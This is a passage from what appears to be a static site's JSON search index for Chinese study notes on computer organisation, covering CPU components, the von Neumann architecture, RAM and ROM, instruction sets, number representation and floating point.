AE%BA/#\u8fd0\u7b97\u5668","text":"","title":"\u8fd0\u7b97\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u63a7\u5236\u5668","text":"\u63a7\u5236\u5668\u662f\u8ba1\u7b97\u673a\u4e2d\u7684\u201c\u795e\u7ecf\u4e2d\u67a2\u201d\uff0c\u5b83\u8d1f\u8d23\u534f\u8c03\u6574\u53f0\u8ba1\u7b97\u673a\u7684\u5de5\u4f5c\uff0c\u4e3b\u8981\u662f\u5206\u6790\u5e76\u5b89\u6392\u7a0b\u5e8f\u7684\u6267\u884c\u3002 \u5728\u73b0\u5728\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u901a\u5e38\u628a\u8fd0\u7b97\u5668\uff08ALU\uff09\u548c\u63a7\u5236\u5668\u5408\u4e8c\u4e3a\u4e00\uff0c\u79f0\u4e4b\u4e3aCPU","title":"\u63a7\u5236\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8f93\u5165\u8f93\u51fa\u8bbe\u5907","text":"\u9664CPU\u548c\u5b58\u50a8\u5668\u4ee5\u5916\u7684\u5176\u5b83\u76f8\u5173\u8bbe\u5907\uff0c\u4e3b\u8981\u7528\u6765\u4f5c\u4e3a\u4eba\u673a\u4ea4\u4e92\u7684\u91cd\u8981\u624b\u6bb5\u3002\u901a\u5e38\u5f88\u591a\u8bbe\u5907\u90fd\u53ef\u4ee5\u7528\u6765\u65e2\u4f5c\u8f93\u5165\u8bbe\u5907\u4e5f\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u8f93\u51fa\u8bbe\u5907\u3002\u5224\u65ad\u65b9\u6cd5\u4e3b\u8981\u662f\u770b\u6570\u636e\u7684\u6d41\u5411\u3002","title":"\u8f93\u5165\uff0c\u8f93\u51fa\u8bbe\u5907"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u6570\u5b57\u5316\u65b9\u6cd5\u8868\u793a\u4fe1\u606f\u7684\u7279\u70b9","text":"(1)\u5728\u7269\u7406\u4e0a\u5bb9\u6613\u5b9e\u73b0 (2)\u6297\u5e72\u6270\u80fd\u529b\u5f3a\uff0c\u53ef\u9760\u6027\u9ad8 (3)\u6570\u503c\u7684\u8868\u793a\u8303\u56f4\u5927\uff0c\u8868\u793a\u7cbe\u5ea6\u9ad8 (4)\u53ef\u8868\u793a\u7684\u4fe1\u606f\u7c7b\u578b\u6781\u5176\u5e7f\u6cdb (5)\u80fd\u7528\u6570\u5b57\u903b\u8f91\u6280\u672f\u8fdb\u884c\u4fe1\u606f\u5904\u7406","title":"\u6570\u5b57\u5316\u65b9\u6cd5\u8868\u793a\u4fe1\u606f\u7684\u7279\u70b9"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u5b58\u50a8\u7a0b\u5e8f\u4e0e\u51af\u8bfa\u4f9d\u66fc\u4f53\u5236","text":"\u51af.\u8bfa\u4f9d\u66fc\uff08\u73b0\u4ee3\u8ba1\u7b97\u673a\u4e4b\u7236\uff09\u63d0\u51fa\u4e86\u5f53\u4ee3\u8ba1\u7b97\u673a\u7ed3\u6784\u7684\u4f53\u5236\u3002 \u3000\uff081\uff09\u91c7\u7528\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u6570\u636e\u548c\u6307\u4ee4 \u3000\uff082\uff09\u91c7\u7528\u5b58\u50a8\u7a0b\u5e8f\u65b9\u5f0f \u3000\uff083\uff09\u7531\u8fd0\u7b97\u5668\u3001\u5b58\u50a8\u5668\u3001\u63a7\u5236\u5668\u3001\u8f93\u5165\u8bbe\u5907\u548c\u8f93\u51fa\u8bbe\u5907\u7b49\u4e94\u5927\u90e8\u4ef6\u7ec4\u6210\u8ba1\u7b97\u673a\u7cfb\u7edf","title":"\u5b58\u50a8\u7a0b\u5e8f\u4e0e\u51af.\u8bfa\u4f9d\u66fc\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u5b58\u50a8\u7a0b\u5e8f\u5de5\u4f5c\u65b9\u5f0f3\u4e2a\u8981\u70b9","text":"\uff081\uff09\u6839\u636e\u6c42\u89e3\u95ee\u9898\u4e8b\u5148\u7f16\u5236\u7a0b\u5e8f \uff082\uff09\u4e8b\u5148\u5c06\u7a0b\u5e8f\u5b58\u5165\u8ba1\u7b97\u673a\u4e2d \uff083\uff09\u8ba1\u7b97\u673a\u81ea\u52a8\u3001\u8fde\u7eed\u5730\u6267\u884c\u7a0b\u5e8f","title":"\u5b58\u50a8\u7a0b\u5e8f\u5de5\u4f5c\u65b9\u5f0f3\u4e2a\u8981\u70b9"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u7ec4\u7ec7","text":"(1) CPU (2) \u5b58\u50a8\u5668 (3)\u8f93\u5165/\u8f93\u51fa\u8bbe\u5907 (4)\u603b\u7ebf (5)\u63a5\u53e3","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u7ec4\u7ec7"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u603b\u7ebf","text":"","title":"\u603b\u7ebf"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#intel-8086\u7cfb\u7edf\u7684\u7ed3\u6784","text":"","title":"Intel 8086\u7cfb\u7edf\u7684\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#rom\u548cram\u7684\u533a\u522b","text":"RAM\uff08random access memory\uff09\u5373\u968f\u673a\u5b58\u50a8\u5185\u5b58\uff0c\u8fd9\u79cd\u5b58\u50a8\u5668\u5728\u65ad\u7535\u65f6\u5c06\u4e22\u5931\u5176\u5b58\u50a8\u5185\u5bb9\uff0c\u6545\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u77ed\u65f6\u95f4\u4f7f\u7528\u7684\u7a0b\u5e8f\u3002ROM\uff08Read-Only Memory\uff09\u5373\u53ea\u8bfb\u5185\u5b58\uff0c\u662f\u4e00\u79cd\u53ea\u80fd\u8bfb\u51fa\u4e8b\u5148\u6240\u5b58\u6570\u636e\u7684\u56fa\u6001\u534a\u5bfc\u4f53\u5b58\u50a8\u5668\u3002","title":"ROM\u548cRAM\u7684\u533a\u522b"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u5fae\u578b\u673a\u7684\u5357\u5317\u6865\u67b6\u6784","text":"","title":"\u5fae\u578b\u673a\u7684\u5357\u5317\u6865\u67b6\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8f6f\u4ef6\u7cfb\u7edf","text":"\u8f6f\u4ef6\u5b9e\u8d28\u4e0a\u5c31\u662f\u53ef\u4ee5\u6267\u884c\u7684\u4e00 \u6bb5\u7a0b\u5e8f\u3002 \u8f6f\u4ef6\u901a\u5e38\u5206\u591a\u79cd\u7c7b\u578b\u3002\u5177\u4f53\u5982\u4e0b\uff1a 1\u3001\u7cfb\u7edf\u8f6f\u4ef6 (1) \u64cd\u4f5c\u7cfb\u7edf\u7c7b\u8f6f\u4ef6 (2)\u8bed\u8a00\u5904\u7406\u7c7b\u8f6f\u4ef6 (3)\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf(DBS) (4)\u5404\u79cd\u670d\u52a1\u6027\u652f\u6491\u8f6f\u4ef6 (5)\u5404\u79cd\u6807\u51c6\u7a0b\u5e8f\u5e93 2\u3001\u5e94\u7528\u7a0b\u5e8f \u5927\u91cf\u7684\u7528\u6237\u8f6f\u4ef6\u548c\u5de5\u5177\u8f6f\u4ef6","title":"\u8f6f\u4ef6\u7cfb\u7edf"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8f6f\u786c\u4ef6\u5c42\u6b21\u7ed3\u6784\u6a21\u578b","text":"","title":"\u8f6f\u786c\u4ef6\u5c42\u6b21\u7ed3\u6784\u6a21\u578b"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8ba1\u7b97\u673a\u7684\u6027\u80fd\u6307\u6807","text":"","title":"\u8ba1\u7b97\u673a\u7684\u6027\u80fd\u6307\u6807"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u5916\u9891","text":"","title":"\u5916\u9891"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8fd0\u7b97\u901f\u5ea6","text":"","title":"\u8fd0\u7b97\u901f\u5ea6"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u6570\u636e\u4f20\u8f93\u7387","text":"","title":"\u6570\u636e\u4f20\u8f93\u7387"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u8ba1\u7b97\u9898","text":"","title":"\u8ba1\u7b97\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/","text":"CPU # CPU\u5de5\u4f5c\u539f\u7406 # CPU\u63a7\u5236\u4fe1\u606f\u4f20\u9001\u7684\u65b9\u5f0f # \u7a0b\u5e8f\u8f93\u5165\u8f93\u51fa\u65b9\u5f0f \u4e2d\u65ad\u65b9\u5f0f DMA\uff08\u76f4\u63a5\u5b58\u50a8\u5668\u8bbf\u95ee\uff09\u65b9\u5f0f \u901a\u9053\u65b9\u5f0f CPU\u6307\u4ee4\u96c6 # CISC # \u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a RISC # \u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u6307\u4ee4\u683c\u5f0f # \u5730\u5740\u7ed3\u6784 # \u6307\u4ee4\u63d0\u4f9b\u5730\u5740\u7684\u65b9\u5f0f # \u5730\u5740\u7ed3\u6784\u7b80\u5316 # \u5404\u79cd\u5bc4\u5b58\u5668 #","title":"CPU"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#cpu","text":"","title":"CPU"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#cpu\u5de5\u4f5c\u539f\u7406","text":"","title":"CPU\u5de5\u4f5c\u539f\u7406"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#cpu\u63a7\u5236\u4fe1\u606f\u4f20\u9001\u7684\u65b9\u5f0f","text":"\u7a0b\u5e8f\u8f93\u5165\u8f93\u51fa\u65b9\u5f0f \u4e2d\u65ad\u65b9\u5f0f DMA\uff08\u76f4\u63a5\u5b58\u50a8\u5668\u8bbf\u95ee\uff09\u65b9\u5f0f \u901a\u9053\u65b9\u5f0f","title":"CPU\u63a7\u5236\u4fe1\u606f\u4f20\u9001\u7684\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#cpu\u6307\u4ee4\u96c6","text":"","title":"CPU\u6307\u4ee4\u96c6"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#cisc","text":"\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a","title":"CISC"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#risc","text":"\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a","title":"RISC"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#\u6307\u4ee4\u683c\u5f0f","text":"","title":"\u6307\u4ee4\u683c\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#\u5730\u5740\u7ed3\u6784","text":"","title":"\u5730\u5740\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#\u6307\u4ee4\u63d0\u4f9b\u5730\u5740\u7684\u65b9\u5f0f","text":"","title":"\u6307\u4ee4\u63d0\u4f9b\u5730\u5740\u7684\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#\u5730\u5740\u7ed3\u6784\u7b80\u5316","text":"","title":"\u5730\u5740\u7ed3\u6784\u7b80\u5316"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%20CPU/#\u5404\u79cd\u5bc4\u5b58\u5668","text":"","title":"\u5404\u79cd\u5bc4\u5b58\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/","text":"\u6570\u636e\u7684\u8868\u793a\u3001\u8fd0\u7b97\u4e0e\u6821\u9a8c # \u6570\u503c\u578b\u6570\u636e\u7684\u8868\u793a # \u4e00\u4e2a\u6570\u503c\u578b\u6570\u636e\u7684\u5b8c\u6574\u8868\u793a\u5305\u542b\u4e09\u65b9\u9762\uff1a \uff081\uff09\u91c7\u7528\u4ec0\u4e48\u8fdb\u4f4d\u8ba1\u6570\u5236 \uff082\uff09\u5982\u4f55\u8868\u793a\u4e00\u4e2a\u5e26\u7b26\u53f7\u7684\u6570\uff08\u539f\u7801\u3001\u53cd\u7801\u3001\u8865\u7801\uff09 \uff083\uff09\u5c0f\u6570\u5982\u4f55\u5904\u7406\uff08\u5b9a\u70b9\u3001\u6d6e\u70b9\uff09 \u5e38\u7528\u7684\u51e0\u79cd\u8fdb\u4f4d\u5236 # \u8fdb\u5236\u8f6c\u6362 # N\u8fdb\u5236\u8f6c\u5341\u8fdb\u5236 # \u5341\u8fdb\u5236\u8f6cN\u8fdb\u5236 # \u5e26\u7b26\u53f7\u6570\u7684\u8868\u793a # \u539f\u7801 # \u53cd\u7801 # \u8865\u7801 # \u8868\u793a\u8303\u56f4 # \u7b97\u672f\u79fb\u4f4d # \u539f\u7801 # \u8865\u7801 # \u603b\u7ed3 # \u5b9a\u70b9\u6570\u548c\u6d6e\u70b9\u6570 # \u5b9a\u70b9\u6570 # \u603b\u7ed3 # \u6d6e\u70b9\u6570 # \u6d6e\u70b9\u6570\u673a\u5668\u683c\u5f0f # \u6d6e\u70b9\u6570\u89c4\u683c\u5316 # \u5c06X\u8868\u793a\u4e3a\u6d6e\u70b9\u6570 \u9898\u76ee # \u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6 # \u8868\u793a\u8303\u56f4 \u4f8b\u9898 # \u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83 # \uff081\uff09\u8868\u793a\u8303\u56f4\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u5927\uff1b \uff082\uff09\u8fd0\u7b97\u7cbe\u5ea6\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u9ad8\uff1b (3) \u8fd0\u7b97\u89c4\u5219: \u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u590d\u6742\uff1b \u5b57\u7b26\u8868\u793a\u65b9\u6cd5 # ASCII\u7801 # 30-> '0' 41->'A' 61->'a' \u6c49\u5b57\u7684\u8f93\u5165\u7801 # \u6570\u5b57\u8f93\u5165\u7801 # \u5c066763\u4e2a\u4e8c\u7ea7\u6c49\u5b57\u5206\u4e3a94\u4e2a\u533a\uff0c\u6bcf\u533a94\u4f4d\uff0c\u628a\u6c49\u5b57\u8868\u793a\u6210\u4e8c\u7ef4\u6570\u7ec4\uff0c\u6570\u7ec4\u4e0b\u6807\u5c31\u662f\u533a\u4f4d\u7801 \u4f18\u7f3a\u70b9\uff1a \u65e0\u91cd\u7801\uff0c\u8f93\u5165\u7801\u4e0e\u5185\u90e8\u7801\u7684\u8f6c\u6362\u65b9\u4fbf\uff0c\u4ee3\u7801\u96be\u4ee5\u8bb0\u5fc6\u3002 \u62fc\u97f3\u8f93\u5165\u7801 # \u4ee5\u6c49\u5b57\u62fc\u97f3\u4e3a\u57fa\u7840\u7684\u8f93\u5165\u65b9\u6cd5\uff08\u5982\u5fae\u8f6f\u62fc\u97f3\uff09 \u4f18\u7f3a\u70b9\uff1a \u7b80\u5355\u65b9\u4fbf\uff1b \u540c\u97f3\u5b57\u591a\uff0c\u91cd\u7801\u7387\u9ad8\uff0c\u5f71\u54cd\u8f93\u5165\u901f\u5ea6\u3002 \u5b57\u5f62\u8f93\u5165\u7801 # \u6839\u636e\u6c49\u5b57\u7684\u4e66\u5199\u5f62\u72b6\u6765\u8fdb\u884c\u7f16\u7801\uff08\u5982\u4e94\u7b14\u5b57\u578b\uff09\u3002\u628a\u6c49\u5b57\u7684\u7b14\u5212\u90e8\u4ef6\u7528\u5b57\u6bcd\u6216\u6570\u5b57\u8fdb\u884c\u7f16\u7801\uff0c\u6309\u7b14\u5212\u987a\u5e8f\u4f9d\u6b21\u8f93\u5165\uff0c\u5c31\u80fd\u5bf9\u5e94\u4e00\u4e2a\u6c49\u5b57\u3002 \u4f18\u7f3a\u70b9\uff1a \u7b80\u5355\u65b9\u4fbf\uff0c\u7b26\u5408\u4e66\u5199\u4e60\u60ef\uff1b \u91cd\u7801\u7387\u9ad8\uff0c\u9700\u8981\u8bb0\u4f4f\u5b57\u5f62\u7ed3\u6784\u3002 \u6c49\u5b57\u5185\u7801 # \u6c49\u5b57\u5b57\u6a21\u7801 # \u8fd0\u7b97 # \u539f\u7801\u52a0\u51cf # \u540c\u53f7\u76f8\u52a0 # \u5f02\u53f7\u76f8\u52a0 # \u8865\u7801\u52a0\u51cf # \u52a0 # \u51cf # \u6ea2\u51fa\u5224\u65ad # \u5224\u65ad\uff1a\u5982\u679c\u4e24\u4e2a\u6b63\u6570\u76f8\u52a0\u7684\u7ed3\u679c\u662f\u8d1f\u6570\uff1b\u4e24\u4e2a\u8d1f\u6570\u76f8\u52a0\u540e\u7684\u7ed3\u679c\u4e3a\u6b63\u6570\uff0c\u5747\u8868\u660e\u53d1\u751f\u6ea2\u51fa\u3002 \u79fb\u4f4d # \u820d\u5165 # \u5b9a\u70b9\u4e58\u6cd5\u8fd0\u7b97 #","title":"\u6570\u636e\u7684\u8868\u793a\u3001\u8fd0\u7b97\u4e0e\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6570\u636e\u7684\u8868\u793a\u8fd0\u7b97\u4e0e\u6821\u9a8c","text":"","title":"\u6570\u636e\u7684\u8868\u793a\u3001\u8fd0\u7b97\u4e0e\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6570\u503c\u578b\u6570\u636e\u7684\u8868\u793a","text":"\u4e00\u4e2a\u6570\u503c\u578b\u6570\u636e\u7684\u5b8c\u6574\u8868\u793a\u5305\u542b\u4e09\u65b9\u9762\uff1a \uff081\uff09\u91c7\u7528\u4ec0\u4e48\u8fdb\u4f4d\u8ba1\u6570\u5236 \uff082\uff09\u5982\u4f55\u8868\u793a\u4e00\u4e2a\u5e26\u7b26\u53f7\u7684\u6570\uff08\u539f\u7801\u3001\u53cd\u7801\u3001\u8865\u7801\uff09 \uff083\uff09\u5c0f\u6570\u5982\u4f55\u5904\u7406\uff08\u5b9a\u70b9\u3001\u6d6e\u70b9\uff09","title":"\u6570\u503c\u578b\u6570\u636e\u7684\u8868\u793a"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5e38\u7528\u7684\u51e0\u79cd\u8fdb\u4f4d\u5236","text":"","title":"\u5e38\u7528\u7684\u51e0\u79cd\u8fdb\u4f4d\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8fdb\u5236\u8f6c\u6362","text":"","title":"\u8fdb\u5236\u8f6c\u6362"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#n\u8fdb\u5236\u8f6c\u5341\u8fdb\u5236","text":"","title":"N\u8fdb\u5236\u8f6c\u5341\u8fdb\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5341\u8fdb\u5236\u8f6cn\u8fdb\u5236","text":"","title":"\u5341\u8fdb\u5236\u8f6cN\u8fdb\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5e26\u7b26\u53f7\u6570\u7684\u8868\u793a","text":"","title":"\u5e26\u7b26\u53f7\u6570\u7684\u8868\u793a"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u539f\u7801","text":"","title":"\u539f\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u53cd\u7801","text":"","title":"\u53cd\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8865\u7801","text":"","title":"\u8865\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8868\u793a\u8303\u56f4","text":"","title":"\u8868\u793a\u8303\u56f4"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u7b97\u672f\u79fb\u4f4d","text":"","title":"\u7b97\u672f\u79fb\u4f4d"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u539f\u7801_1","text":"","title":"\u539f\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8865\u7801_1","text":"","title":"\u8865\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u603b\u7ed3","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5b9a\u70b9\u6570\u548c\u6d6e\u70b9\u6570","text":"","title":"\u5b9a\u70b9\u6570\u548c\u6d6e\u70b9\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5b9a\u70b9\u6570","text":"","title":"\u5b9a\u70b9\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u603b\u7ed3_1","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6d6e\u70b9\u6570","text":"","title":"\u6d6e\u70b9\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E